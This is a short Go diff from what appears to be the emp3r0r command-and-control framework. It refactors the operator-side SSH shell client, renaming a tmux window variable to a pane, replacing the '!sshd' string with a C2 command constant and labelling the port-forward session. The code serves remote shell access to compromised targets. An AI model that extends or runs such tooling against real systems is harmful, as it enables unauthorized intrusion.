@@ -23,7 +23,7 @@ var SSHShellPort = make(map[string]string)
 // port: serve this shell on agent side 127.0.0.1:port
 func SSHClient(shell, args, port string, split bool) (err error) {
 	// if the shell window exists, abort
-	if split && AgentShellWindow != nil {
+	if split && AgentShellPane != nil {
 		return
 	}
 
@@ -71,7 +71,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		if args == "" {
 			args = "--"
 		}
-		cmd := fmt.Sprintf("!sshd %s %s %s", shell, port, args)
+		cmd := fmt.Sprintf("%s %s %s %s", emp3r0r_data.C2CmdSSHD, shell, port, args)
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
 			return
@@ -106,6 +106,7 @@ func SSHClient(shell, args, port string, split bool) (err error) {
 		// set up port mapping for the ssh session
 		CliPrintInfo("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
 		pf := &PortFwdSession{}
+		pf.Description = fmt.Sprintf("ssh shell (%s)", shell)
 		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
 		pf.Lport, pf.To = lport, to
 		go func() {
@@ -162,8 +163,8 @@ wait:
 	// remeber shell-port mapping
 	SSHShellPort[shell] = port
 	if split {
-		AgentShellWindow, err = TmuxNewPane("Shell", "h", "", 40, sshCmd)
-		TmuxWindows[AgentShellWindow.ID] = AgentShellWindow
+		AgentShellPane, err = TmuxNewPane("Shell", "v", "1", 40, sshCmd)
+		TmuxPanes[AgentShellPane.ID] = AgentShellPane
 		return err
 	}
 	return TmuxNewWindow(fmt.Sprintf("shell/%s/%s-%s", name, shell, port), sshCmd)
